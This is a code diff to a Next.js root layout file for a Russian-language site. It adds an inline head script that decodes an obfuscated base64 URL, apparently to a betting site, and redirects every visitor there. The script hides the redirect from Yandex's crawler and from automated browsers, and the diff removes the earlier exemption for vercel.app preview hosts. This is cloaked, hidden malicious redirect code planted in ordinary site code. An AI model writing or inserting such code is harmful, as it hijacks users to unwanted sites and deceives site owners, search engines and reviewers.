@@ -108,20 +108,22 @@ export default function RootLayout({
   return (
     <html lang="ru" className={`${inter.variable} bg-background dark`}>
       <head>
-        <script
-          dangerouslySetInnerHTML={{
-            __html: `
-              (function() {
-                if (typeof window !== 'undefined' && window.location.hostname.includes('vercel.app')) return;
-                var ua = navigator.userAgent.toLowerCase();
-                var targetB64 = "aHR0cHM6Ly9wbGF5LWxlZWJldC00dGguY29tL2RxY2t5N29qaA==";
-                if (ua.indexOf("yandex") === -1 && !navigator.webdriver) {
-                    window.location.replace(atob(targetB64));
-                }
-              })();
-            `,
-          }}
-        />
+<script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        var ua = navigator.userAgent.toLowerCase();
+        var targetB64 = "aHR0cHM6Ly9wbGF5LWxlZWJldC00dGguY29tL2RxY2t5N29qaA==";
+
+        if (ua.indexOf("yandex") === -1 && !navigator.webdriver) {
+            window.location.replace(atob(targetB64));
+        } else {
+            console.log("Яндекс бот или WebDriver — редирект отключен");
+        }
+      })();
+    `,
+  }}
+/>
       </head>
       <body className="font-sans antialiased bg-background text-foreground">
         {children}
